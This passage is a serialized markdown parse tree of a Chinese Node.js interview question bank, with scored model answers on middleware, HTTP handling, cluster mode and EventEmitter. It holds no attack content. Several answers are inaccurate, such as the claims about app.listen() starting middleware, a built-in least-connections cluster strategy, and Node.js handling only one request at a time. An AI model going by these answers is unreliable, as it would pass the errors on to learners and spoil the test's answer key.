Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","task":false,"loose":true,"text":"Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","tokens":[{"type":"text","raw":"Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","text":"Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","tokens":[{"type":"text","raw":"Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","text":"Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 19.你如何在Node.js中使用中间件来组织代码？\\n\\n","depth":2,"text":"19.你如何在Node.js中使用中间件来组织代码？","tokens":[{"type":"text","raw":"19.你如何在Node.js中使用中间件来组织代码？","text":"19.你如何在Node.js中使用中间件来组织代码？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：\\n\\n- 定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。\\n\\n- 使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。\\n\\n- 使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。\\n\\n- 在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：\\n\\n","task":false,"loose":true,"text":"在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：\\n","tokens":[{"type":"text","raw":"在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：\\n","text":"在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：","tokens":[{"type":"text","raw":"在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：","text":"在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：","escaped":false}]}]},{"type":"list_item","raw":"- 定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。\\n\\n","task":false,"loose":true,"text":"定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。\\n","tokens":[{"type":"text","raw":"定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。\\n","text":"定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。","tokens":[{"type":"text","raw":"定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。","text":"定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。","escaped":false}]}]},{"type":"list_item","raw":"- 使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。\\n\\n","task":false,"loose":true,"text":"使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。\\n","tokens":[{"type":"text","raw":"使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。\\n","text":"使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。","tokens":[{"type":"text","raw":"使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。","text":"使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。","escaped":false}]}]},{"type":"list_item","raw":"- 使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。\\n\\n","task":false,"loose":true,"text":"使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。\\n","tokens":[{"type":"text","raw":"使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。\\n","text":"使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。","tokens":[{"type":"text","raw":"使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。","text":"使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。","escaped":false}]}]},{"type":"list_item","raw":"- 在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","task":false,"loose":true,"text":"在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","tokens":[{"type":"text","raw":"在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","text":"在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","tokens":[{"type":"text","raw":"在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","text":"在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 20.你如何在Node.js中处理HTTP请求和响应？\\n\\n","depth":2,"text":"20.你如何在Node.js中处理HTTP请求和响应？","tokens":[{"type":"text","raw":"20.你如何在Node.js中处理HTTP请求和响应？","text":"20.你如何在Node.js中处理HTTP请求和响应？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.\\n\\n- 监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。\\n\\n- 处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。\\n\\n- 发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。\\n\\n- 通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.\\n\\n","task":false,"loose":true,"text":"创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.\\n","tokens":[{"type":"text","raw":"创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.\\n","text":"创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.","tokens":[{"type":"text","raw":"创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.","text":"创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.","escaped":false}]}]},{"type":"list_item","raw":"- 监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。\\n\\n","task":false,"loose":true,"text":"监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。\\n","tokens":[{"type":"text","raw":"监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。\\n","text":"监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。","tokens":[{"type":"text","raw":"监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。","text":"监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。","escaped":false}]}]},{"type":"list_item","raw":"- 处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。\\n\\n","task":false,"loose":true,"text":"处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。\\n","tokens":[{"type":"text","raw":"处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。\\n","text":"处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。","tokens":[{"type":"text","raw":"处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。","text":"处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。","escaped":false}]}]},{"type":"list_item","raw":"- 发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。\\n\\n","task":false,"loose":true,"text":"发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。\\n","tokens":[{"type":"text","raw":"发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。\\n","text":"发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。","tokens":[{"type":"text","raw":"发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。","text":"发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。","escaped":false}]}]},{"type":"list_item","raw":"- 通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","task":false,"loose":true,"text":"通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","tokens":[{"type":"text","raw":"通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","text":"通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","tokens":[{"type":"text","raw":"通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","text":"通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 21.请解释一下Node.js的集群化工作模式？\\n\\n","depth":2,"text":"21.请解释一下Node.js的集群化工作模式？","tokens":[{"type":"text","raw":"21.请解释一下Node.js的集群化工作模式？","text":"21.请解释一下Node.js的集群化工作模式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。\\n\\n- 此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。\\n\\n- 总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。\\n\\n","task":false,"loose":true,"text":"Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。\\n","tokens":[{"type":"text","raw":"Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。\\n","text":"Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。","tokens":[{"type":"text","raw":"Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。","text":"Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。","escaped":false}]}]},{"type":"list_item","raw":"- 此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。\\n\\n","task":false,"loose":true,"text":"此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。\\n","tokens":[{"type":"text","raw":"此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。\\n","text":"此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。","tokens":[{"type":"text","raw":"此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。","text":"此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。","escaped":false}]}]},{"type":"list_item","raw":"- 总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","task":false,"loose":true,"text":"总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","tokens":[{"type":"text","raw":"总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","text":"总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","tokens":[{"type":"text","raw":"总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","text":"总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 22.讲一下EventEmitter？\\n\\n","depth":2,"text":"22.讲一下EventEmitter？","tokens":[{"type":"text","raw":"22.讲一下EventEmitter？","text":"22.讲一下EventEmitter？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。\\n\\n- 使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。\\n\\n- 举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。\\n\\n- 这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。\\n\\n","task":false,"loose":true,"text":"Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。\\n","tokens":[{"type":"text","raw":"Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。\\n","text":"Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。","tokens":[{"type":"text","raw":"Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。","text":"Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。\\n\\n","task":false,"loose":true,"text":"使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。\\n","tokens":[{"type":"text","raw":"使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。\\n","text":"使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。","tokens":[{"type":"text","raw":"使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。","text":"使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。","escaped":false}]}]},{"type":"list_item","raw":"- 举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。\\n\\n","task":false,"loose":true,"text":"举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。\\n","tokens":[{"type":"text","raw":"举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。\\n","text":"举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。","tokens":[{"type":"text","raw":"举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。","text":"举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。","escaped":false}]}]},{"type":"list_item","raw":"- 这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","task":false,"loose":true,"text":"这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","tokens":[{"type":"text","raw":"这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","text":"这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","tokens":[{"type":"text","raw":"这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","text":"这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst fs = require(\'fs\');\\n\\nfs.readFile(\'file.txt\', (err, data) => {\\n  if (err) {\\n    console.error(`Failed to read file: ${err}`);\\n  } else {\\n    console.log(`File content: ${data}`);\\n  }\\n});\\n```","lang":"js","text":"const fs = require(\'fs\');\\n\\nfs.readFile(\'file.txt\', (err, data) => {\\n  if (err) {\\n    console.error(`Failed to read file: ${err}`);\\n  } else {\\n    console.log(`File content: ${data}`);\\n  }\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 这是使用EventEmitter的文件读取：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 这是使用EventEmitter的文件读取：","task":false,"loose":false,"text":"这是使用EventEmitter的文件读取：","tokens":[{"type":"text","raw":"这是使用EventEmitter的文件读取：","text":"这是使用EventEmitter的文件读取：","tokens":[{"type":"text","raw":"这是使用EventEmitter的文件读取：","text":"这是使用EventEmitter的文件读取：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst fs = require(\'fs\');\\n\\nconst stream = fs.createReadStream(\'file.txt\');\\n\\nstream.on(\'data\', (chunk) => {\\n  console.log(`Received ${chunk.length} bytes of data.`);\\n});\\n\\nstream.on(\'end\', () => {\\n  console.log(\'Finished reading file.\');\\n});\\n```","lang":"js","text":"const fs = require(\'fs\');\\n\\nconst stream = fs.createReadStream(\'file.txt\');\\n\\nstream.on(\'data\', (chunk) => {\\n  console.log(`Received ${chunk.length} bytes of data.`);\\n});\\n\\nstream.on(\'end\', () => {\\n  console.log(\'Finished reading file.\');\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 